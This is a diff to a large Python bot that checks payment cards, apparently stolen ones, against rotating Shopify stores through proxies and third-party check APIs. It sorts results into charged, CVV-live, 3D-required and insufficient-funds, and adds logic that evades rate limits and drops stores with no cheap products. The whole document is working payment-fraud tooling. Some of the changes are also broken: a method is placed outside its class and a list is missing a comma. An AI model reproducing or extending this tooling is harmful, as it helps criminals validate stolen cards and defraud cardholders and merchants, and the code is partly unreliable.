@@ -11944,6 +11944,10 @@ SHOPIFY_API_POOL = [
 
 # ============ SHOPIFY API POOL MANAGER - WITH SITE ROTATION ============
 
+# ============ SHOPIFY API POOL MANAGER - WITH SITE ROTATION ============
+
+# ============ SHOPIFY API POOL MANAGER - WITH SITE ROTATION ============
+
 class ShopifyAPIPool:
     """
     Rotates between multiple Shopify APIs to distribute load
@@ -12114,13 +12118,16 @@ class ShopifyAPIPool:
         return self.session
     
     async def get_next_api(self) -> dict:
+        """Get next enabled API using weighted round-robin - ONLY ENABLED APIS"""
         async with self._lock:
-            for api in self.apis:
-                api["enabled"] = True
-            
-            enabled_apis = self.apis.copy()
+            enabled_apis = [api for api in self.apis if api.get("enabled", True)]
+            if not enabled_apis:
+                print("⚠️ No Shopify APIs enabled! Re-enabling all...")
+                for api in self.apis:
+                    api["enabled"] = True
+                    enabled_apis = self.apis.copy()
+                    
             total_weight = sum(api.get("weight", 1) for api in enabled_apis)
-            
             rand = random.uniform(0, total_weight)
             cumulative = 0
             
@@ -12131,13 +12138,11 @@ class ShopifyAPIPool:
                     break
             else:
                 selected = enabled_apis[0]
-            
             self.last_used[selected["name"]] = time.time()
             
             stats = self.api_stats.get(selected["name"], {})
             success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
-            
-            print(f"🔄 [API POOL] Selected: {selected['name']} (weight: {selected.get('weight', 1)}, success: {success_rate:.0f}%)")
+            print(f"🔄 [API POOL] Selected: {selected['name']} ✅ (weight: {selected.get('weight', 1)}, success: {success_rate:.0f}%)")
             
             return selected.copy()
     
@@ -12304,74 +12309,43 @@ class ShopifyAPIPool:
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 
+                # ============ FIX: Check for site_removed flag ============
                 if result.get("site_removed", False):
                     print(f"🗑️ [API POOL] Site {current_site} was removed")
+                    # Remove from tried_sites so we can try a different one
+                    if current_site in tried_sites:
+                        tried_sites.remove(current_site)
+                    continue
+                
+                # ============ FIX: Check for NO_PRODUCT_ERROR specifically ============
+                if result.get("result") == "NO_PRODUCT_ERROR" or "No products under" in result.get("message", ""):
+                    print(f"🔄 [NO PRODUCT] Site {current_site} has no products under $10 - trying next site")
+                    # Remove this site from rotation
+                    if current_site in autosopi_site_manager.sites:
+                        autosopi_site_manager.remove_site(current_site, OWNER_ID)
+                    # Remove from tried_sites so we can try a different one
+                    if current_site in tried_sites:
+                        tried_sites.remove(current_site)
+                    # Continue to next site
                     continue
                 
                 response_text = result.get("message", "")
                 response_upper = response_text.upper()
                 status_category = result.get("status_category", "")
                 
-                # ============ CHECK FOR 429 RATE LIMIT ============
-                is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text or "Cart failed with status 429" in response_text
+                # ============ FIX: Check for retryable status BEFORE checking decline patterns ============
+                if status_category == "retryable":
+                    print(f"🔄 [API POOL] Retryable error: {response_text[:100]}")
+                    self.mark_api_result(api_name, False, elapsed, True)
+                    # Continue to next attempt with different site/proxy
+                    continue
                 
+                # ============ CHECK FOR 429 RATE LIMIT ============
+                is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text
                 if is_rate_limit:
                     print(f"🚫 [RATE LIMIT] 429 detected for site {current_site}")
                     self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=True)
                     self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
-                    continue
-                
-                # ============ CHECK FOR RETRYABLE ERRORS ============
-                retryable_patterns = [
-                    "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
-                    "CART FAILED WITH STATUS", "SITE ERROR! STATUS", "Unable to get payment token", 
-                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",  # <-- ADD THIS
-    "PAYMENTS_FLEXIBILITY_TERMS_ID_MISMATCH",  
-     "Unable to get payment token",
-     "SERVER DISCONNECTED",
-     "UNKNOWN",                         # <-- ADD THIS
-            "GATEWAY UNKNOWN",                 # <-- ADD THIS
-            "UNKNOWN GATEWAY",                 # <-- ADD THIS
-            "Gateway Unknown",                 # <-- ADD THIS
-            "gateway unknown",  
-            "Invalid JSON",                    # <-- KEEP THIS
-            "Invalid JSON response",           # <-- ADD THIS
-            "Expecting value",                 # <-- ADD THIS
-            "JSON parse error",                # <-- ADD THIS
-            "JSON_ERROR", 
-    "Unable to get payment token: 403",
-    "payment token: 403",
-    "PAYMENT TOKEN: 403",
-    "403",
-    "payment token failed",
-    "token generation failed",
-    "Failed to get payment token",
-    "GET PAYMENT TOKEN FAILED",
-    "PAYMENT_TOKEN_FAILED",
-    "TOKEN_GENERATION_FAILED",# <-- ADD THIS
-    "PAYMENTS_TERMS_ID_MISMATCH",                      # <-- ADD THIS
-    "TERMS_ID_MISMATCH",                               # <-- ADD THIS
-    "FLEXIBILITY_TERMS",                               # <-- ADD THIS
-    "PAYMENT_FLEXIBILITY",                             # <-- ADD THIS
-    "CART_FAILED",                                     # <-- ADD THIS
-    "Cart failed",                                     # <-- ADD THIS
-    "CART_FAILED_WITH_STATUS",                         # <-- ADD THIS
-    "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",           # <-- ADD THIS
-    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",        # <-- ADD THIS
-    "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
-                    "Throttled", "TIMEOUT", "CONNECTION ERROR","payment token: 403",
-                    "PROXY DEAD", "SITE DEAD", "SERVER DISCONNECTED","Unable to get payment token",  # <-- ADD THIS
-    "payment token: 403",           # <-- ADD THIS
-    "403"
-                    "Invalid JSON", "HTML", "EMPTY_RESPONSE",
-                    "NO_SESSION_TOKEN", "SITE DEAD", "PROXY DEAD"
-                ]
-                
-                is_retryable = any(pattern in response_upper for pattern in retryable_patterns)
-                
-                if is_retryable:
-                    print(f"🔄 [API POOL] Retryable error: {response_text[:100]}")
-                    self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 
                 # ============ CHECK FOR CHARGED/APPROVED ============
@@ -12454,35 +12428,75 @@ class ShopifyAPIPool:
         Make request to a specific API with proxy support
         """
         
-        # Parse card
-        parts = card.split('|')
-        if len(parts) != 4:
-            return {
-                "status": "error",
-                "result": "INVALID_FORMAT",
-                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
-                "status_display": "⚠️ INVALID FORMAT",
-                "status_category": "error"
-            }
-        
-        card_num, month, year, cvv = parts
-        
-        # Format year (2-digit for all bladesarksapi)
-        if len(year) == 4:
-            year_formatted = year[2:]
-        else:
-            year_formatted = year
-        
-        formatted_card = f"{card_num}|{month}|{year_formatted}|{cvv}"
-        
-        # Clean site URL
+        # ============ FIX: Initialize ALL variables before try block ============
+        price = "0.00"
+        gateway = "Shopify Payments"
         site_clean = site.replace('http://', '').replace('https://', '')
         if site_clean.endswith('/'):
             site_clean = site_clean[:-1]
+        elapsed = 0
+        using_proxy = False
+        response_text = ""
+        data = {}
+        no_product_errors = []
+        # ==================================================
         
-        site_removed = False
+        if not api.get("enabled", True):
+            print(f"⏭️ Skipping disabled API: {api.get('name', 'Unknown')}")
+            return {
+                "status": "error",
+                "result": "API_DISABLED",
+                "message": "API is disabled",
+                "status_display": "⚠️ DISABLED",
+                "status_category": "retryable",
+                "elapsed": 0,
+                "price": price,
+                "gateway": gateway,
+                "site": site_clean,
+                "proxy_used": proxy,
+                "api_name": api.get('name', 'Unknown')
+            }
+        
+        no_product_errors = [
+            "No products under $10 found!",
+            "No products under $10",
+            "No products under $3 found!",
+            "No products under $3",
+            "No products under",
+            "No valid products found",
+            "No products found",
+            "No products under $10 ound!",
+            "<b>No products under $10 ound!</b>",
+        ]
         
         try:
+            # Parse card
+            parts = card.split('|')
+            if len(parts) != 4:
+                return {
+                    "status": "error",
+                    "result": "INVALID_FORMAT",
+                    "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                    "status_display": "⚠️ INVALID FORMAT",
+                    "status_category": "error",
+                    "elapsed": 0,
+                    "price": price,
+                    "gateway": gateway,
+                    "site": site_clean,
+                    "proxy_used": proxy,
+                    "api_name": api.get('name', 'Unknown')
+                }
+            
+            card_num, month, year, cvv = parts
+            
+            # Format year (2-digit for all bladesarksapi)
+            if len(year) == 4:
+                year_formatted = year[2:]
+            else:
+                year_formatted = year
+            
+            formatted_card = f"{card_num}|{month}|{year_formatted}|{cvv}"
+            
             params = {
                 "site": f"https://{site_clean}",
                 "cc": formatted_card
@@ -12496,8 +12510,6 @@ class ShopifyAPIPool:
                 'follow_redirects': True,
                 'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10)
             }
-            
-            using_proxy = False
             
             if proxy:
                 formatted_proxy = format_proxy(proxy)
@@ -12550,7 +12562,12 @@ class ShopifyAPIPool:
                     "message": "407 Proxy Authentication Required - trying next proxy",
                     "status_display": "⚠️ PROXY AUTH FAILED",
                     "status_category": "retryable",
-                    "elapsed": elapsed
+                    "elapsed": elapsed,
+                    "price": price,
+                    "gateway": gateway,
+                    "site": site_clean,
+                    "proxy_used": proxy,
+                    "api_name": api.get('name', 'Unknown')
                 }
             
             if response.status_code != 200:
@@ -12561,7 +12578,12 @@ class ShopifyAPIPool:
                         "message": f"HTTP Error: {response.status_code}",
                         "status_display": f"⚠️ HTTP {response.status_code}",
                         "status_category": "retryable",
-                        "elapsed": elapsed
+                        "elapsed": elapsed,
+                        "price": price,
+                        "gateway": gateway,
+                        "site": site_clean,
+                        "proxy_used": proxy,
+                        "api_name": api.get('name', 'Unknown')
                     }
                 return {
                     "status": "error",
@@ -12569,7 +12591,12 @@ class ShopifyAPIPool:
                     "message": f"HTTP Error: {response.status_code}",
                     "status_display": f"⚠️ HTTP {response.status_code}",
                     "status_category": "error",
-                    "elapsed": elapsed
+                    "elapsed": elapsed,
+                    "price": price,
+                    "gateway": gateway,
+                    "site": site_clean,
+                    "proxy_used": proxy,
+                    "api_name": api.get('name', 'Unknown')
                 }
             
             try:
@@ -12585,7 +12612,12 @@ class ShopifyAPIPool:
                         "status_display": "⚠️ SITE REMOVED",
                         "status_category": "retryable",
                         "elapsed": elapsed,
-                        "site_removed": True
+                        "site_removed": True,
+                        "price": price,
+                        "gateway": gateway,
+                        "site": site_clean,
+                        "proxy_used": proxy,
+                        "api_name": api.get('name', 'Unknown')
                     }
                 return {
                     "status": "error",
@@ -12593,7 +12625,12 @@ class ShopifyAPIPool:
                     "message": "Invalid JSON response",
                     "status_display": "⚠️ JSON ERROR",
                     "status_category": "retryable",
-                    "elapsed": elapsed
+                    "elapsed": elapsed,
+                    "price": price,
+                    "gateway": gateway,
+                    "site": site_clean,
+                    "proxy_used": proxy,
+                    "api_name": api.get('name', 'Unknown')
                 }
             
             response_text = data.get("Response", data.get("response", data.get("message", data.get("status", "UNKNOWN"))))
@@ -12603,37 +12640,33 @@ class ShopifyAPIPool:
             
             response_upper = response_text.upper()
             
-            no_product_errors = [
-                "No products under $10 found!",
-                "No products under $10",
-                "No products under $3 found!",
-                "No products under $3",
-                "No products under",
-                "No valid products found",
-                "No products found",
-                "VALIDATION_CUSTOM",
-                "NO_PRODUCT",
-                "PRODUCT_NOT_FOUND",
-                "NO VARIANTS",
-                "No Variants",
-            ]
-            
+            # ============ FIX: Check for NO PRODUCT errors FIRST ============
             if any(err in response_text for err in no_product_errors):
-                print(f"🔄 [NO PRODUCT] Retryable error: {response_text[:100]}")
+                print(f"🔄 [NO PRODUCT] Site has no products under $10: {site_clean}")
+                
+                # Remove the site immediately
+                print(f"🗑️ [SITE REMOVAL] Removing site {site_clean} (no products under $10)")
+                autosopi_site_manager.remove_site(site_clean, OWNER_ID)
+                if site_clean in self.site_performance:
+                    del self.site_performance[site_clean]
+                self.good_sites_cache_time = 0
+                
                 return {
                     "status": "error",
                     "result": "NO_PRODUCT_ERROR",
                     "message": response_text,
-                    "status_display": "🔄 NO PRODUCT - RETRYING",
+                    "status_display": "🔄 NO PRODUCT - REMOVING SITE",
                     "status_category": "retryable",
                     "elapsed": elapsed,
                     "price": str(price),
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown'),
+                    "site_removed": True
                 }
             
+            # Check for 429 rate limit
             if "429" in response_text or "Site Error! Status: 429" in response_text:
                 print(f"🚫 [RATE LIMIT] Rate limit detected on proxy: {mask_proxy(proxy)}")
                 if proxy and user_id:
@@ -12655,10 +12688,11 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"],
+                    "api_name": api.get('name', 'Unknown'),
                     "is_rate_limit": True
                 }
             
+            # Check for good response indicators
             good_indicators = [
                 "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
                 "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
@@ -12675,6 +12709,7 @@ class ShopifyAPIPool:
                 site_quality_tracker.record_response(site_clean, response_text, "good", price_float)
                 self._update_site_performance(site_clean, response_text, is_good=True, is_rate_limit=False)
             
+            # Check for site removal errors
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
                     if site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False):
@@ -12685,7 +12720,6 @@ class ShopifyAPIPool:
                         if site_clean in self.site_performance:
                             del self.site_performance[site_clean]
                         self.good_sites_cache_time = 0
-                        site_removed = True
                     return {
                         "status": "error",
                         "result": removal_error,
@@ -12696,9 +12730,12 @@ class ShopifyAPIPool:
                         "price": str(price),
                         "gateway": gateway,
                         "site_removed": True,
-                        "site": site_clean
+                        "site": site_clean,
+                        "proxy_used": proxy,
+                        "api_name": api.get('name', 'Unknown')
                     }
             
+            # Check for real decline
             real_decline_patterns = [
                 "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", 
                 "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD",
@@ -12730,9 +12767,10 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown')
                 }
             
+            # Check for CHARGED
             if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
                 print(f"🔥 [API] CHARGED detected!")
                 return {
@@ -12746,9 +12784,10 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown')
                 }
             
+            # Check for 3D/OTP
             if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
                 print(f"🔐 [API] 3D REQUIRED detected!")
                 return {
@@ -12762,9 +12801,10 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown')
                 }
             
+            # Check for INSUFFICIENT FUNDS
             if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                 print(f"💰 [API] INSUFFICIENT FUNDS detected!")
                 return {
@@ -12778,9 +12818,10 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown')
                 }
             
+            # Check for CVV LIVE
             if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
                 print(f"✅ [API] CVV LIVE detected!")
                 return {
@@ -12794,54 +12835,55 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown')
                 }
             
+            # Check for retryable errors
             retryable_patterns = [
                 "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
                 "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
                 "CART FAILED WITH STATUS 422",
-                 "Unable to get payment token",
-    "Unable to get payment token: 403",
-    "payment token: 403",
-    "PAYMENT TOKEN: 403",
-    "UNKNOWN",                         # <-- ADD THIS
-            "GATEWAY UNKNOWN",                 # <-- ADD THIS
-            "UNKNOWN GATEWAY",                 # <-- ADD THIS
-            "Gateway Unknown",                 # <-- ADD THIS
-            "gateway unknown",  
-    "403",
-    "payment token failed",
-    "SERVER DISCONNECTED",
-            "Invalid JSON",                    # <-- KEEP THIS
-            "Invalid JSON response",           # <-- ADD THIS
-            "Expecting value",                 # <-- ADD THIS
-            "JSON parse error",                # <-- ADD THIS
-            "JSON_ERROR", 
-    "token generation failed",
-    "Failed to get payment token",
-    "GET PAYMENT TOKEN FAILED",
-    "PAYMENT_TOKEN_FAILED",
-    "TOKEN_GENERATION_FAILED","CART FAILED WITH STATUS 429",
+                "Unable to get payment token",
+                "Unable to get payment token: 403",
+                "payment token: 403",
+                "PAYMENT TOKEN: 403",
+                "UNKNOWN",
+                "GATEWAY UNKNOWN",
+                "UNKNOWN GATEWAY",
+                "Gateway Unknown",
+                "gateway unknown",  
+                "403",
+                "payment token failed",
+                "SERVER DISCONNECTED",
+                "Invalid JSON",
+                "Invalid JSON response",
+                "Expecting value",
+                "JSON parse error",
+                "JSON_ERROR", 
+                "token generation failed",
+                "Failed to get payment token",
+                "GET PAYMENT TOKEN FAILED",
+                "PAYMENT_TOKEN_FAILED",
+                "TOKEN_GENERATION_FAILED","CART FAILED WITH STATUS 429",
                 "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
-                "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",  # <-- ADD THIS
-    "PAYMENTS_FLEXIBILITY_TERMS_ID_MISMATCH",          # <-- ADD THIS
-    "PAYMENTS_TERMS_ID_MISMATCH",                      # <-- ADD THIS
-    "TERMS_ID_MISMATCH",                               # <-- ADD THIS
-    "FLEXIBILITY_TERMS",                               # <-- ADD THIS
-    "PAYMENT_FLEXIBILITY",                             # <-- ADD THIS
-    "CART_FAILED",                                     # <-- ADD THIS
-    "Cart failed",                                     # <-- ADD THIS
-    "CART_FAILED_WITH_STATUS",                         # <-- ADD THIS
-    "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",           # <-- ADD THIS
-    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",        # <-- ADD THIS
-    "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
+                "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
+                "PAYMENTS_FLEXIBILITY_TERMS_ID_MISMATCH",
+                "PAYMENTS_TERMS_ID_MISMATCH",
+                "TERMS_ID_MISMATCH",
+                "FLEXIBILITY_TERMS",
+                "PAYMENT_FLEXIBILITY",
+                "CART_FAILED",
+                "Cart failed",
+                "CART_FAILED_WITH_STATUS",
+                "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
+                "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
+                "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
                 "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","payment token: 403","Unable to get payment token", 
                 "INVALID_PAYMENT_METHOD", "Site not supported",
                 "NO VARIANTS", "Not Shopify!", "No Valid Products",
-                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Unable to get payment token",  # <-- ADD THIS
-    "payment token: 403",           # <-- ADD THIS
-    "403"
+                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Unable to get payment token",
+                "payment token: 403",
+                "403",
                 "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
                 "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
                 "PAYMENT_METHOD_NOT_ACCEPTED",
@@ -12870,9 +12912,10 @@ class ShopifyAPIPool:
                     "gateway": gateway,
                     "site": site_clean,
                     "proxy_used": proxy,
-                    "api_name": api["name"]
+                    "api_name": api.get('name', 'Unknown')
                 }
             
+            # Unknown response - treat as DECLINED
             print(f"❌ [API] Unknown response - treating as DECLINED")
             return {
                 "status": "declined",
@@ -12885,7 +12928,7 @@ class ShopifyAPIPool:
                 "gateway": gateway,
                 "site": site_clean,
                 "proxy_used": proxy,
-                "api_name": api["name"]
+                "api_name": api.get('name', 'Unknown')
             }
                 
         except httpx.TimeoutException:
@@ -12896,7 +12939,12 @@ class ShopifyAPIPool:
                 "message": "Request timeout",
                 "status_display": "⚠️ TIMEOUT",
                 "status_category": "retryable",
-                "elapsed": 0
+                "elapsed": elapsed,
+                "price": price,
+                "gateway": gateway,
+                "site": site_clean,
+                "proxy_used": proxy,
+                "api_name": api.get('name', 'Unknown')
             }
         except Exception as e:
             print(f"❌ API request error: {e}")
@@ -12906,7 +12954,12 @@ class ShopifyAPIPool:
                 "message": str(e)[:100],
                 "status_display": "⚠️ REQUEST ERROR",
                 "status_category": "retryable",
-                "elapsed": 0
+                "elapsed": elapsed,
+                "price": price,
+                "gateway": gateway,
+                "site": site_clean,
+                "proxy_used": proxy,
+                "api_name": api.get('name', 'Unknown')
             }
     
     def get_site_performance_stats(self) -> str:
@@ -12975,6 +13028,10 @@ class ShopifyAPIPool:
 
 # Create global instance
 shopify_api_pool = ShopifyAPIPool()
+
+
+
+
 
 
 
@@ -16474,6 +16531,54 @@ class AutosopiSiteManager:
     def get_next_site(self) -> str:
         """Legacy method - use get_next_site_weighted() instead"""
         return self.get_next_site_weighted()
+    
+    # ============ ADD THIS METHOD TO AutosopiSiteManager CLASS ============
+def handle_no_product_site(self, site: str, user_id: int = None) -> Tuple[bool, str]:
+    """
+    Handle a site with no products under $10.
+    Removes the site after 1 occurrence and returns status.
+    Returns: (was_removed, message)
+    """
+    normalized_site = self.normalize_site_url(site)
+    
+    # Check if site exists
+    if normalized_site not in self.sites:
+        return False, "Site not found in rotation"
+    
+    # ============ REMOVE IMMEDIATELY AFTER 1 OCCURRENCE ============
+    print(f"🗑️ [NO PRODUCTS] Removing site: {normalized_site} (no products under $10)")
+    
+    # Remove the site from rotation
+    if normalized_site in self.sites:
+        self.sites.remove(normalized_site)
+    
+    # Clean up stats
+    if normalized_site in self.site_stats:
+        del self.site_stats[normalized_site]
+    if normalized_site in self.site_failures:
+        del self.site_failures[normalized_site]
+    if normalized_site in self.sites_to_remove:
+        self.sites_to_remove.remove(normalized_site)
+    
+    # Also remove from site_quality_tracker
+    if normalized_site in site_quality_tracker.good_sites:
+        site_quality_tracker.good_sites.discard(normalized_site)
+    if normalized_site in site_quality_tracker.bad_sites:
+        site_quality_tracker.bad_sites.discard(normalized_site)
+    if normalized_site in site_quality_tracker.site_quality:
+        del site_quality_tracker.site_quality[normalized_site]
+    if normalized_site in site_quality_tracker.price_cache:
+        del site_quality_tracker.price_cache[normalized_site]
+    
+    # Save changes
+    self.save_sites()
+    site_quality_tracker.save_stats()
+    
+    # Reset rotation indices to avoid using removed site
+    self.reset_rotation()
+    
+    print(f"✅ Site removed: {normalized_site}")
+    return True, f"Site removed: {normalized_site} (no products under $10)"
 
 # Create global instance
 autosopi_site_manager = AutosopiSiteManager()
@@ -29901,15 +30006,15 @@ async def quick_command_handler(update: Update, context: ContextTypes.DEFAULT_TY
 
 async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
     """
-    Check card using Shopify Mass API
-    API format: http://108.165.12.183:8081/?cc=CARD&url=SITE&proxy=PROXY
-    FIXED: Proper JSON parsing without double-consuming response body
+    Check card using Shopify Mass API with auto-removal of sites with no products under $10
     """
     print(f"\n{'='*80}")
     print(f"💳 [SHOPIFY MASS API] Checking card: {card[:20]}...")
     print(f"📍 Site: {site}")
     if proxy:
         print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    if retry_count > 0:
+        print(f"🔄 RETRY ATTEMPT #{retry_count}")
     print(f"{'='*80}")
     
     default_result = {
@@ -29930,7 +30035,7 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
             return {
                 "status": "error",
                 "result": "INVALID_FORMAT",
-                "message": "Invalid card format",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                 "status_display": "⚠️ INVALID FORMAT",
                 "status_category": "error"
             }
@@ -29950,7 +30055,7 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
         if site_clean.endswith('/'):
             site_clean = site_clean[:-1]
         
-        # Build URL with parameters (root endpoint, not /check)
+        # Build URL with parameters
         params = {
             "cc": formatted_card,
             "url": site_clean
@@ -29970,6 +30075,7 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
         # Use the correct endpoint (root, not /check)
         api_url = SHOPIFY_MASS_API_ENDPOINT
         
+        # ============ FIXED: Use a new client for each request to avoid connection issues ============
         async with httpx.AsyncClient(
             timeout=httpx.Timeout(timeout_seconds, connect=15.0, read=timeout_seconds - 10),
             verify=False,
@@ -29990,7 +30096,7 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
         print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
         
         if response.status_code == 200:
-            # ============ FIXED: Parse JSON directly FIRST ============
+            # Parse JSON
             try:
                 data = response.json()
             except json.JSONDecodeError as e:
@@ -29998,9 +30104,12 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
                 raw_preview = response.text[:300] if response.text else "[Empty Response]"
                 print(f"📄 Raw response preview: {raw_preview}")
                 
-                if retry_count < 1:
+                # Retry on JSON error
+                if retry_count < 2:
+                    print(f"🔄 JSON error - retrying (attempt {retry_count + 1}/2)...")
                     await asyncio.sleep(2)
                     return await check_card_shopify_mass(card, site, proxy, user_id, retry_count + 1)
+                
                 default_result["message"] = "Invalid JSON response from API"
                 default_result["elapsed"] = elapsed
                 return default_result
@@ -30015,6 +30124,83 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
             approved = data.get("Approved", data.get("approved", "False"))
             
             response_upper = response_text.upper()
+            
+            # ============ CHECK FOR NO PRODUCTS UNDER $10 ============
+            no_product_errors = [
+                "No products under $10 found!",
+                "No products under $10",
+                "No products under $3 found!",
+                "No products under $3",
+                "No products under",
+                "No valid products found",
+                "No products found",
+                "VALIDATION_CUSTOM",
+                "NO_PRODUCT",
+                "PRODUCT_NOT_FOUND",
+                "NO VARIANTS",
+                "No Variants",
+                "No products under $10 ound!",
+                "<b>No products under $10 ound!</b>",
+            ]
+            
+            is_no_product = any(err in response_text for err in no_product_errors)
+            
+            # ============ IF NO PRODUCTS, REMOVE SITE AND RETRY ============
+            if is_no_product:
+                print(f"🗑️ [NO PRODUCTS] Site has no products under $10: {site_clean}")
+                
+                # Remove the site immediately
+                was_removed, remove_msg = autosopi_site_manager.handle_no_product_site(site_clean, user_id)
+                
+                if was_removed:
+                    print(f"✅ Site removed: {site_clean}")
+                    
+                    # Retry with a different site (max 3 retries)
+                    max_retries = 100
+                    if retry_count < max_retries:
+                        print(f"🔄 Retrying with a different site (attempt {retry_count + 1}/{max_retries})...")
+                        
+                        # Get a new site (skip the removed one)
+                        new_site = autosopi_site_manager.get_next_site_weighted()
+                        if new_site and new_site != site_clean:
+                            await asyncio.sleep(1)
+                            return await check_card_shopify_mass(card, new_site, proxy, user_id, retry_count + 1)
+                        else:
+                            print(f"⚠️ No alternative site available")
+                    else:
+                        print(f"⚠️ Max retries ({max_retries}) reached for no products error")
+                
+                # If we can't retry, return error
+                return {
+                    "status": "error",
+                    "result": "NO_PRODUCTS",
+                    "message": f"Site has no products under $10: {site_clean}",
+                    "status_display": "⚠️ NO PRODUCTS",
+                    "status_category": "error",
+                    "elapsed": elapsed,
+                    "price": "0.00",
+                    "gateway": gateway,
+                    "site_removed": True
+                }
+            
+            # ============ CHECK FOR SITE REMOVAL ERRORS ============
+            for removal_error in SITE_REMOVAL_ERRORS:
+                if removal_error.upper() in response_upper:
+                    print(f"🗑️ [MSH] SITE REMOVAL: {removal_error} for site {site_clean}")
+                    autosopi_site_manager.handle_no_product_site(site_clean, user_id)
+                    return {
+                        "status": "error",
+                        "result": removal_error,
+                        "message": response_text,
+                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
+                        "status_category": "error",
+                        "elapsed": elapsed,
+                        "price": "0.00",
+                        "gateway": gateway,
+                        "site_removed": True
+                    }
+                               
+                       
             
             # ============ DECLINE PATTERNS - MARK AS DECLINED ============
             decline_patterns = [
